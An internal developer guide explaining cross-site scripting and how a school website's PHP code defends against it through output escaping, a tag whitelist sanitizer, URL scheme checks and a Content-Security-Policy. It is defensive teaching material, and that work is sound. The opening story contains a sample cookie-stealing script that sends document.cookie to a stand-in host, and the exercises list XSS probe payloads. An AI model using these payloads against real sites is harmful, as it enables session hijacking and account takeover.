# Output Escaping and XSS

> **What you'll learn:** what XSS (Cross-Site Scripting) actually is, why browsers are so easy to
> fool, what our one-line `e()` helper really does, why a handful of columns are allowed to skip
> it, and how to check any page you touch in under a minute.
>
> **Prerequisites:** you can read basic PHP (`echo`, `$variables`, arrays, `foreach`) and you know
> a web page is text the server sends to a browser. No security background assumed — every term is
> defined the first time it appears.
>
> **Where it lives in our code:** `src/helpers.php:40` (the `e()` function),
> `src/Content/Sanitizer.php` (the rich-text whitelist), `public_html/admin/api/_bootstrap.php:57`
> (the write-time validator), and every `<?= … ?>` in `views/` and `public_html/`.

## 1. The one-paragraph version

When our PHP code prints a value that came from the database or from a visitor, we do **not** print
it directly. We print it through a function called `e()`. That function rewrites the five characters
that mean something special in HTML (`<`, `>`, `&`, `"`, `'`) into harmless look-alike codes. The
browser then shows those characters as *text on the page* instead of obeying them as *instructions*.
There is exactly one exception: database columns whose names end in `_html`. Those may be printed
raw, because they were cleaned **once, at the moment they were saved**, by `SJ\Content\Sanitizer` —
which throws away every tag except `b`, `strong`, `i`, `em`, `br`, `p`, and `span class="hl-gold"`,
and throws away **every attribute**. Escape on output, sanitise on input, never mix the two up.

## 2. The problem this solves

### 2.1 A story

The school secretary edits the principal's name in our admin panel. Instead of typing
`Fr. Susai Appar`, she pastes this — maybe copied from a spam email, maybe her account was phished:

```html
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
```

Now suppose our home page printed the name like this. **This is the bug we prevent:**

```php
<h2><?= $sj_principal['person_name'] ?></h2>   <!-- WRONG: no e() -->
```

The browser receives `<h2><script>fetch(…)</script></h2>` and has no way to know that `<script>` came
from a database row rather than from our own template. It sees a script tag, so it **runs the
JavaScript inside it**. On every visit. By every visitor. Silently.

`document.cookie` is the browser's small bag of key/value data for our site — including the session
cookie that says *"this browser is logged in as admin."* So the moment the real admin opens the home
page, her session identifier is sent to `evil.example`. The attacker pastes that cookie into his own
browser and **is** the admin: rename pages, upload files, deface the school's site. No password
needed. That is XSS — think of it as **"the attacker got his JavaScript to run inside your page."**

### 2.2 The root cause: the browser cannot tell your data from your markup

An HTML page is one long stream of text. There is no separate channel for "this part is code" and
"this part is content". The browser decides which is which purely from punctuation: `<` starts a tag,
`"` ends an attribute value. So when you paste a value into your HTML, you are not "inserting data" —
you are **editing the source code of the page at runtime**. If the value contains `<`, you have
written a new tag. That is the whole vulnerability, in one sentence. Escaping fixes it by making the
punctuation inert: `<` becomes `&lt;`, which the browser draws as a less-than sign, never as a tag.

### 2.3 Three flavours you should be able to name

| Flavour | Where the payload lives | Example against our site | Who gets hit |
|---|---|---|---|
| **Stored** | In the database, saved once, served forever | A testimonial whose `name_html` contains `<script>` | Every visitor, until someone notices |
| **Reflected** | In the URL, bounced straight back into the page | `gallery.php?album=<svg onload=alert(1)>` if we echoed `$_GET` raw | Only people who click the attacker's link |
| **DOM-based** | Never touches the server; page JavaScript builds HTML from untrusted text | Admin JS doing `el.innerHTML = row.title` unescaped | Whoever is on that screen |

Stored is the worst (it scales), reflected needs bait, DOM-based hides from server-side review
because the dangerous line sits in a `.js` file. Our catalog tracks all three: `SECURITY.md:22`
(SEC-02, stored), `SECURITY.md:28` (SEC-03, reflected), `SECURITY.md:34` (SEC-04, DOM).

## 3. How it works in general

### 3.1 Five contexts, not one

"Escaping" is not one operation. It depends on **where in the page** the value lands.

| # | Context | Example | What breaks out of it |
|---|---|---|---|
| 1 | Element text | `<h2>HERE</h2>` | `<` (starts a tag) |
| 2 | Attribute value | `<a title="HERE">` | `"` or `'` (ends the attribute) |
| 3 | URL | `<a href="HERE">` | `javascript:` schemes, `&`/`#` confusion |
| 4 | Inside `<script>` | `var x = "HERE";` | `"`, `</script`, backslashes, newlines |
| 5 | Inside CSS | `<div style="color:HERE">` | `;`, `}`, `url(...)` |

HTML-escaping is the correct answer for **1 and 2 only**. In a **URL**, `&lt;` protects nothing —
`href="javascript:alert(1)"` contains no special HTML character at all, yet it runs code on click;
URLs need scheme filtering, and values placed in a query string need `rawurlencode()`. Inside a
**`<script>` block** HTML-escaping is actively wrong: the browser parses that region as JavaScript,
so `&quot;` is a syntax error, not safety — use `json_encode()`. Inside **CSS**, HTML escaping does
not stop `}` from closing your rule and opening a new one.

**Rule of thumb here:** put dynamic values in contexts 1 and 2, where `e()` is right. When you need
3, 4 or 5, stop and think — or restructure so you don't need to. §4.5 shows the one place this
codebase deliberately mixes 2 and 4, and how it stays safe.

### 3.2 Escape on output vs sanitise on input

- **Escaping on output** = "show this exactly as typed, never interpret it." Reversible, lossless,
  applied every time you print. This is `e()`.
- **Sanitising on input** = "keep a few safe tags, delete the rest, store the cleaned result." Lossy
  and permanent, applied once at save time. This is `Sanitizer::html()`.

You want escaping almost always; sanitising only when the content is *meant* to be HTML.

## 4. How we use it — every place in this codebase

### 4.1 The `e()` helper

Four lines, and the most important function in the repo — `src/helpers.php:39-43`:

```php
/** htmlspecialchars(ENT_QUOTES, UTF-8) — EVERY echoed dynamic value goes through this. */
function e($v): string
{
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}
```

It is loaded through Composer's `files` autoload, so it exists before any page code runs
(`src/helpers.php:2-5`). Every argument matters:

| Piece | Why it's there |
|---|---|
| `(string)$v` | The parameter is untyped, so values arrive as `int`, `float` or `null` from DB rows. `htmlspecialchars()` needs a string, and PHP 8 throws a `TypeError` on `null`. The cast turns `null` into `''` and saves every caller from writing `?? ''`. |
| `ENT_QUOTES` | The default flag set escapes `<`, `>`, `&` and `"` — but **not** the single quote `'`. Our templates use single-quoted attributes in places (`views/shell.php:74`), so a `'` in a value could close the attribute and inject `onmouseover=…`. `ENT_QUOTES` adds `'` → `&#039;`. Never rely on the default. |
| `'UTF-8'` | The character set PHP should assume when reading the input bytes. If PHP guesses a different encoding than the browser uses, a crafted multi-byte sequence can be re-read as `<` *after* escaping — a real historical attack class. We state it, and `views/shell.php:26` declares `<meta charset="UTF-8">` so both ends agree. |

Result: `<script>` becomes `&lt;script&gt;`, which the browser paints as literal text. Nothing runs.

### 4.2 The project rule

From `CLAUDE.md`, "Coding conventions (non-negotiable)":

> **Output:** every echoed dynamic value goes through `e()` … The only exception is columns ending
> `_html`, which must have passed `sj_sanitize_html()` on write. Never raw-echo anything else.

The same rule is item 3 of the mandatory pre-ship checklist at `SECURITY.md:174`, which you must
affirm in your completion summary before anything ships. Correct usage from the home page
(`views/pages/home.php:26-27`) and the footer (`views/partials/footer.php:27`, `:42`):

```php
<h2 class="ab-1"<?= ed_field('profile', $sj_principal['id'], 'person_name') ?>><?= e($sj_principal['person_name']) ?></h2>
<li>Morning : <?= e($sj_f_morning) ?></li>
<a href="<?= e($sj_f_yt) ?>" target="_blank" rel="noopener" class="social-icon" …>
```

That last line puts a value into an `href` — **context 3**. `e()` handles the quoting; the
`javascript:` problem is handled separately at write time (§4.4). `views/partials/contact.php:88`
adds a second layer, filtering *before* escaping so the `tel:` URL cannot contain punctuation at all:
`<a href="tel:<?= e(preg_replace('/[^0-9]/', '', $sj_c_phone)) ?>">`. Even our attribute emitters
escape internally (`src/View/EditAttrs.php:26`):

```php
$attrs = \sprintf(' data-edit-field="%s:%d:%s" data-edit-type="%s"', e($entity), (int)$id, e($field), e($def['type']));
```

### 4.3 The `_html` exception and sanitise-on-write

Some fields genuinely need formatting: the principal's message wants paragraphs, a testimonial name wants a
gold highlight. Those store HTML, and we mark them by **naming the column with an `_html` suffix**. That suffix
is a promise: *this value was cleaned when it was saved.* The cleaner is `src/Content/Sanitizer.php` — 44
lines, read the whole thing. The core (`src/Content/Sanitizer.php:21-37`):

```php
$html = \strip_tags($html, '<b><strong><i><em><br><p><span>');

// Drop every attribute; keep class="hl-gold" on span when present.
$html = \preg_replace_callback(
    '/<\s*(b|strong|i|em|p|br|span)\b([^>]*)>/i',
    static function ($m) {
        $tag = \strtolower($m[1]);
        if ($tag === 'span' && \stripos($m[2], 'hl-gold') !== false) {
            return '<span class="hl-gold">';
        }
        …
        return '<' . $tag . '>';
    },
    $html
);
```

Read the second step carefully — it is the clever bit. It does **not** inspect attributes and decide which are
safe. It **rebuilds each opening tag from a literal string**. `$m[2]` (everything the author wrote inside the
tag) is matched and then *thrown away*; the only thing it can influence is one yes/no question — does it
contain the text `hl-gold`? If yes you get the fixed literal `<span class="hl-gold">`; otherwise `<span>`. So
no attribute can be smuggled through: `onclick`, `onerror`, `style`, `href` — none survive, because none are
ever *copied*. `SECURITY.md:24` gives this as the reason SEC-02 sits at 🟡 not 🔴. Anything outside the seven
allowed tags is removed by `strip_tags()`: the markup vanishes, the inner text stays, so
`<script>alert(1)</script>` becomes `alert(1)` — visible text, zero behaviour. The header comment
(`src/Content/Sanitizer.php:9`) is blunt: *"The whitelist is FROZEN — do not widen it."*

**Why sanitise on write instead of on read?**

| | Sanitise on write (ours) | Sanitise on read |
|---|---|---|
| How often it runs | Once per save — a few times a week | Every field, every page, every visitor |
| Cost | Free at render time | Regex work inside every loop |
| If you forget it once | Bad HTML is stored, but you can find and fix the rows | That page is exploitable forever |
| What's in the DB | Only clean HTML | Raw attacker input, one export away from trouble |

Write-once also fits our budget (`CLAUDE.md`: ≤ 12 SQL queries per page, no per-row work in loops).
Which columns are `html`-typed is declared in `SJ\Content\Registry` — `src/Content/Registry.php:29`
(`heading_html`), `:49` (`message_html`), `:57` (`body_html`), `:179` (`name_html`), `:180`. A field
not in the registry cannot be written at all.

Raw-echo sites are deliberately few. `SJ\View\EditAttrs::rich()` is the sanctioned one — in edit mode
it wraps the value in a layout-neutral `<div style="display:contents">`, otherwise it does
`echo (string)$html;` (`src/View/EditAttrs.php:78-81`). It is called as
`ed_rich('profile', $sj_principal['id'], 'message_html', $sj_principal['message_html'])`
(`views/pages/home.php:28`) — 14 call sites across 8 view files, every one passing an `_html` column.

### 4.4 The write path that makes the promise true

The `_html` promise holds only if **every** write route sanitises. All of them funnel through one
function, `api_validate_field()` at `public_html/admin/api/_bootstrap.php:57-119`. Three branches
matter (`:73-88`):

```php
case 'text':
    $v = trim(strip_tags((string)$value));
    …
case 'html':
    $v = sj_sanitize_html((string)$value);
    …
case 'url':
    $v = trim((string)$value);
    if (preg_match('/^(javascript|data|vbscript):/i', $v) || preg_match('/[\x00-\x1f]/', $v)) {
        api_fail("Field '$field' is not a valid link");
    }
```

- **`text`** → `strip_tags()`. Plain fields cannot even *contain* markup in the database, so they are protected
  twice: cleaned on write, escaped by `e()` on read.
- **`html`** → `sj_sanitize_html()`, the global wrapper for `Sanitizer::html()` (`src/helpers.php:83-86`). This
  is the only door HTML uses to enter the DB (`SECURITY.md:10`).
- **`url`** → rejects `javascript:`, `data:` and `vbscript:`, plus any control character (`\x00`–`\x1f`) that
  could split the scheme, e.g. `java\nscript:alert(1)`. This matters because `e()` cannot help here:
  `href="javascript:alert(1)"` has no HTML metacharacter, passes escaping untouched, and still runs on click.
  Only a scheme check stops it — on the write side, once.

Every save reaches this function: `public_html/admin/api/field.php:15`, plus `item.php:59` and `:102` for
creates and bulk updates. Each of those files starts with `require __DIR__ . '/_bootstrap.php';`, which also
enforces login and CSRF (`public_html/admin/api/_bootstrap.php:22-37`) before a byte is stored.

### 4.5 The attribute trick: JSON inside a single-quoted attribute

Our admin overlay needs structured data in the HTML — image presets, the field list for an "Add"
modal. We pass it as JSON in a `data-` attribute so no inline `<script>` is needed (which keeps our
CSP strict, §4.6). Five places do it identically — `views/shell.php:74`,
`public_html/admin/_layout.php:94`, `:64` (`data-panel-add`) and `:74` (`data-panel-photos`), plus
`src/View/EditAttrs.php:71` (`data-edit-add`):

```php
data-sj-presets='<?= str_replace("'", '&#39;', json_encode($__presets, JSON_UNESCAPED_SLASHES)) ?>'
```

Why is that one `str_replace` enough?

1. **`json_encode()` already handles `"`, `<` and `>`.** Double quotes inside JSON strings come out as `\"`,
   and the attribute is delimited by **single** quotes anyway, so a `"` cannot terminate it. A `<` cannot start
   a tag either: inside an attribute value the HTML parser is looking only for the closing `'`.
2. **The single quote is therefore the only character that can escape the attribute.** Replacing every `'` with
   the entity `&#39;` removes exactly that one escape hatch. The browser decodes `&#39;` back to `'` before
   handing the value to JavaScript, so `JSON.parse()` still sees valid JSON. Safety with zero data loss.

The pairing is load-bearing: this replacement is correct **because** the attribute uses single quotes. If
someone "tidies" `data-sj-presets='…'` into `data-sj-presets="…"`, the protection silently vanishes and any `"`
in the JSON ends the attribute early. Keep the quote style. `SECURITY.md:36` flags the residual risk honestly:
today the JSON is built from registry labels we wrote in code, not from the database. If labels ever become
editable, the whole payload needs real HTML-encoding rather than this one-character replacement.

### 4.6 CSP — the second wall

`SJ\Admin\Auth::headers()` sends a Content-Security-Policy on admin responses
(`src/Admin/Auth.php:98-102`):

```php
"Content-Security-Policy: default-src 'self'; " .
"img-src 'self' data:; style-src 'self' 'unsafe-inline'; " .
"script-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
```

A CSP is a list of rules the browser enforces about what a page may load and run. `script-src 'self'` means
"only run JavaScript served from our own domain", so an injected `<script src="https://evil.example/x.js">` is
blocked — and so is inline `<script>…</script>`, because inline code is not `'self'`. Treat it as a **seatbelt,
not a substitute for escaping**: CSP reduces the damage of a bug you already have, `e()` prevents the bug. Note
the policy comes from `sj_admin_headers()`, called from admin pages and admin APIs
(`public_html/admin/api/_bootstrap.php:8`, `public_html/admin/_layout.php:7`) — so a missed `e()` on a *public*
page has no CSP behind it. For the full header set read §8 of [`../02-security.md`](../02-security.md); if this
folder gains a dedicated security-headers topic doc, read that too.

### 4.7 The audit: every `<?=` in the repo, classified

Counts from grepping `views/` and `public_html/**/*.php`.

| Category | `views/` | `public_html/` | Safe? | Why |
|---|---|---|---|---|
| `<?= e(…) ?>` | 120 | 47 | ✅ | HTML-escaped at print time |
| `ed_field` / `ed_item` / `ed_add` | 54 / 19 / 10 | — | ✅ | Attribute emitters, escape internally (`src/View/EditAttrs.php:26`, `:41`, `:71`) |
| `panel_add_attr` / `panel_photos_attr` | — | 19 / 4 | ✅ | Same pattern (`public_html/admin/_layout.php:45-75`) |
| `img_tag(…)` | 28 | — | ✅ | Builds `<img>` via `SJ\Media\Html` |
| Raw `_html` columns | **2** | **1** | ✅ by contract | Sanitised on write |
| Loop counters, `(int)` casts | ~50 | ~12 | ✅ | Integers, not strings |
| Static ternaries, emoji, `SJ_ASSET_VER` | rest | rest | ✅ | Both outcomes are code literals |
| **Total `<?=`** | **326** | **119** | | |

The three raw `_html` echo sites — memorise them, they are the only ones:

| File:line | Column | Registry type |
|---|---|---|
| `views/pages/home.php:16` | `$sj_page['heading_html']` | `html` (`src/Content/Registry.php:29`) |
| `views/partials/testimonial.php:16` | `$t['name_html']` | `html` (`src/Content/Registry.php:179`) |
| `public_html/admin/section.php:94` | `$p['message_html']` | `html` (`src/Content/Registry.php:49`) |

Plus the 14 `ed_rich()` calls, raw by design and always given an `_html` column.

The reflected surface is currently near zero: public pages take no query parameters, and the one slug
we use comes from the script's own filename, never from the request (`views/shell.php:16`) — then is
escaped anyway at `:28`. `SECURITY.md:30` warns this changes the day gallery or marks pages gain
`?album=` / `?year=`.

## 5. Why this is the right approach here

**An auto-escaping template engine (Twig, Latte, Blade).** These escape by default, so forgetting is
impossible — genuinely the strongest option. But `CLAUDE.md` fixes the stack as "**No framework** — structured
plain PHP", and `vendor/` is **committed to git and uploaded by hand** to MilesWeb shared hosting with no SSH.
Twig plus dependencies is a large tree to commit, diff and re-upload on every deploy, and it wants a
compiled-template cache directory that shared hosting makes awkward. We also have 42 pages of legacy markup
that must stay **pixel-identical** to the baseline (the visual-freeze rule in `CLAUDE.md`); re-typing them into
a new template syntax is exactly the churn that lets pixels drift.

**Sanitising on read instead of on write.** Rejected on cost and blast radius — see §4.3. It puts regex work
inside every render loop, fighting our per-page budget, and leaves raw attacker payloads in the database.

**A real HTML purifier library (e.g. HTMLPurifier).** DOM-based, handles malformed nesting, far more rigorous
than our regexes — `SECURITY.md:25` explicitly says a `DOMDocument`-based sanitiser is worth considering. But
it is a multi-megabyte dependency with its own cache directory, for a site with **one editor** whose entire
formatting need is **bold, italic, line break, paragraph, and a gold highlight**. Our 44-line sanitiser covers
exactly that, and is short enough that a new intern can read it end to end and be sure it is correct — itself
a security property. The narrowness *is* the design: a whitelist of seven tags and zero attributes has a tiny
attack surface precisely because it can express so little.

## 6. How this scales

**10× the fields and pages.** "Always call `e()`" does not get harder to *state*, but it gets much
harder to *enforce*. It rests entirely on review discipline: one tired afternoon, one new partial, one
missing `e(`, and you have stored XSS. The `SECURITY.md:174` checklist is the current control, and a
checklist is a human process — at 3,000 echo sites it will fail eventually. What you would add:

1. **A grep-based linter in CI.** Flag any `<?=` in `views/` or `public_html/` that is not `e(`, a
   known-safe emitter (`ed_*`, `panel_*_attr`, `img_tag`), an int cast, or a raw `_html` column. A few
   dozen lines; catches the common mistake immediately. The table in §4.7 is its spec.
2. **A registry-aware check.** For each raw-echo site, assert the column ends `_html` *and* that the
   registry types it `html`. Closes the gap where someone renames a column.
3. **Auto-escaping templates.** If the page count doubles again the calculation flips: escaping by
   default and opting *out* explicitly is safer than escaping by hand and hoping. Do it after the
   visual freeze lifts, page by page with a pixel diff each — never as a big-bang rewrite.

**What the frozen whitelist will cost.** Sooner or later the school will ask for a link in the
principal's message, or a bulleted list of achievements. Neither `a` nor `ul`/`li` is on the
whitelist, and `a` is the genuinely dangerous one: allowing it means allowing `href`, which means
re-implementing the scheme filter from the `url` branch inside the sanitiser and getting it right for
every encoding trick. Lists are safer (`ul`, `ol`, `li`, no attributes), but each addition is a
deliberate decision, not a one-line patch — `CLAUDE.md` and `src/Content/Sanitizer.php:9` both say the
whitelist is frozen. Widening it needs explicit user sign-off, a fresh run of the SEC-02 probe set
(`SECURITY.md:26`), and probably a move to a DOM-based sanitiser first.

## 7. Gotchas and mistakes to avoid

**1. Forgetting `e()` in a new partial.** The number-one real-world failure. It looks fine in testing,
because your own test data has no `<` in it. Habit to build: type `<?= e( ?>` first, *then* put the
variable inside. If you catch yourself typing `<?= $` in a view, stop.

**2. Escaping twice.** `e(e($x))` turns `Tom & Jerry` into `Tom &amp;amp; Jerry`, which the page
displays literally as `Tom &amp; Jerry`. Not a hole — a visible, confusing cosmetic bug. It happens
when a helper already escapes and you wrap it again: `ed_field()` escapes internally
(`src/View/EditAttrs.php:26`), so never write `e(ed_field(…))`. Escape once, at the last moment.

**3. Using `e()` inside a `<script>` block.** Wrong context (§3.1, context 4):

```php
<script>var name = "<?= e($user['name']) ?>";</script>   <!-- WRONG -->
```

A name containing `"` produces `&quot;` — a JavaScript syntax error, not safety. And a value containing the
literal text `</script>` ends the block early no matter how you HTML-escape, letting the rest be parsed as
markup. Use `json_encode()`, which produces a valid JS literal. Better still, follow the pattern this repo
already uses: put the data in a `data-` attribute (§4.5) and read it from an external `.js` file — that also
keeps `script-src 'self'` satisfiable.

**4. Trusting a value because "an admin typed it."** Wrong for three reasons: the admin account can be
phished; the admin's browser can be compromised and made to submit requests (that is what the CSRF check at
`public_html/admin/api/_bootstrap.php:32-37` is for); and an admin can paste from a source she did not write.
`SECURITY.md:8` lists "a compromised admin browser" as an explicit threat actor. XSS in the *admin panel* is
worse than on the public site, not better — that is where the powerful session lives.

**5. Putting user data in a URL without `rawurlencode()`.** `e()` is not a URL encoder:

```php
<a href="/search.php?q=<?= e($q) ?>">                  <!-- WRONG -->
<a href="/search.php?q=<?= e(rawurlencode($q)) ?>">    <!-- right -->
```

Without encoding, a `&` in the value splits it into a second query parameter and a `#` truncates it — parameter
injection, occasionally worse. `rawurlencode()` first (URL layer), then `e()` (HTML layer), in that order.
Whole-URL values also need the scheme check, which lives on the write side
(`public_html/admin/api/_bootstrap.php:87`).

**6. Assuming `strip_tags()` is a sanitiser.** Fine for the `text` branch, where the goal is "no markup at
all" — but *not* a whitelist you can trust with attributes, which is why the `html` branch adds the
attribute-rebuilding pass.

## 8. Try it yourself

Start the stack with `./run.sh`, then open http://localhost:8090/admin/ (credentials in
[`../README.md`](../README.md)).

**A — a plain `text` field.** Edit a hero-slide caption title (registry type `text`) and save
`<script>alert(1)</script>`. Open the public page and use **View Source** (`Ctrl+U`), not just the rendered
page. Expect `alert(1)` with no tags at all: `strip_tags()` removed the markup at
`public_html/admin/api/_bootstrap.php:74`, and `e()` would have neutralised it even if it hadn't. Two
independent defences.

**B — an `html` field.** Edit the principal's message (`message_html`, type `html`) and save:

```html
<b onclick="alert(1)">bold</b><script>alert(2)</script><a href="javascript:alert(3)">link</a>
```

Expected stored value: `<b>bold</b>alert(2)link`. `onclick` is gone — the opening tag was rebuilt from the
literal `'<' . $tag . '>'` (`src/Content/Sanitizer.php:34`). `<script>` is gone but its text kept
(`strip_tags()`, line 21). `<a>` is gone entirely, taking the `javascript:` URL with it — `a` is not on the
whitelist.

**C — the highlight span.** Save `<span class="hl-gold" onmouseover="alert(1)">Gold</span>`. Expect
`<span class="hl-gold">Gold</span>`: the class survives because the callback matched `hl-gold` and emitted the
fixed literal; `onmouseover` was never copied (`src/Content/Sanitizer.php:28-30`).

**D — the URL guard.** Find a `url`-typed field and try to save `javascript:alert(1)`. Expect the error "is
not a valid link" from `public_html/admin/api/_bootstrap.php:88`, and no DB change.

**E — see escaping work.** In any `text` field save `Tom & "Jerry" <3`. View Source should show
`Tom &amp; &quot;Jerry&quot; &lt;3`; the rendered page should show `Tom & "Jerry" <3`. Then **break it on
purpose** (locally, never commit): change one `<?= e($x) ?>` in a view to `<?= $x ?>`, re-run experiment A,
watch the alert fire, then `git checkout -- <file>`. Seeing the failure once teaches more than reading this
doc twice.

## 9. Where to read more

**In this repo:**

- [`../02-security.md`](../02-security.md) — §2 covers XSS in beginner terms, §8 the security headers including CSP.
- [`../05-stage-e.md`](../05-stage-e.md) — how content moved into the database; the origin of the registry and the `_html` field types.
- [`../06-stage-f.md`](../06-stage-f.md) — the live-edit overlay, where `ed_field()`, `ed_rich()` and the `data-edit-*` attributes come from.
- [`../../../SECURITY.md`](../../../SECURITY.md) — SEC-02 (stored XSS, with a ready-made probe list at line 26), SEC-03 (reflected), SEC-04 (DOM), and the §4 pre-ship checklist you must affirm.
- [`../../../CLAUDE.md`](../../../CLAUDE.md) — the non-negotiable conventions, including the `e()` rule and the frozen whitelist.
- The code itself: `src/helpers.php`, `src/Content/Sanitizer.php`, `public_html/admin/api/_bootstrap.php`. All three are short. Read them, not summaries of them.

**Outside:**

- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — the canonical rules, organised by the five contexts from §3.1.
- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) — for when you write admin JavaScript.
- [MDN: `Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) — what each directive in our header actually does.
- [PHP manual: `htmlspecialchars()`](https://www.php.net/manual/en/function.htmlspecialchars.php) — read the flags table, especially the note on the default flag set changing between PHP versions. That is why we always pass `ENT_QUOTES` explicitly.
